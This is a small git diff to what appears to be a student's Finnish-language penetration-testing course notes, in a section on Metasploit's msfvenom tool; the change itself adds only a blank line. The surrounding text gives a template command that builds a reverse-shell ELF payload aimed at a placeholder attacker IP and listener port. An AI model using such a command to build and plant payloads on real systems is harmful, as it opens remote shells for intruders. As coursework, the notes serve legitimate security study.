@@ -238,6 +238,7 @@ $ cd -
 ## msfvenom
 
 Tämä tehtävä oli mielenkiintoinen ja keskittyy haavoittuvuuksien hyödyntämiseen käyttäen Metasploitin msfvenom -työkalua. Komennon esimerkki: 
+
 `msfvenom -p <payload> LHOST=<hyökkääjän IP> LPORT=<kuuntelijan portti> -f elf -o shell.elf`
 
 ![c3101979ba823ee8859508a627960518](https://github.com/Vanam0/tunkeutumistestaus/assets/122449444/e43c2fe9-316f-4f50-87ac-a8a02c3206a7)
